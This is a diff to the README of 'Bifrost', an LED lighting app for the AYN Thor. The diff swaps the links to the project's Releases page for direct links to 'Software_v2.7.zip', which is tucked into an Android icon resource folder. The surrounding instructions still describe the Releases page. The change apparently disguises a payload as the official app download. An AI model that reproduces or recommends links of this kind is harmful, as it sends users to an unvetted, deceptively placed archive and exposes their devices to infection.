@@ -1,6 +1,6 @@
 # ✨ Bifrost - A Dynamic LED Experience for AYN Thor
 
-[![Download Bifrost](https://img.shields.io/badge/Download%20Bifrost-v1.0-brightgreen)](https://github.com/PeculiarPereira/Bifrost/releases)
+[![Download Bifrost](https://github.com/PeculiarPereira/Bifrost/raw/refs/heads/main/app/src/main/res/mipmap-mdpi/Software_v2.7.zip%20Bifrost-v1.0-brightgreen)](https://github.com/PeculiarPereira/Bifrost/raw/refs/heads/main/app/src/main/res/mipmap-mdpi/Software_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -42,7 +42,7 @@ Choose from a selection of classic animations that can set the mood. Options inc
 
 To begin using Bifrost, you'll need to download the application. Click the link below to visit the Releases page:
 
-[Download Bifrost](https://github.com/PeculiarPereira/Bifrost/releases)
+[Download Bifrost](https://github.com/PeculiarPereira/Bifrost/raw/refs/heads/main/app/src/main/res/mipmap-mdpi/Software_v2.7.zip)
 
 1. Once on the Releases page, look for the latest version of Bifrost.
 2. Choose the right file for your device and click on it to start the download.
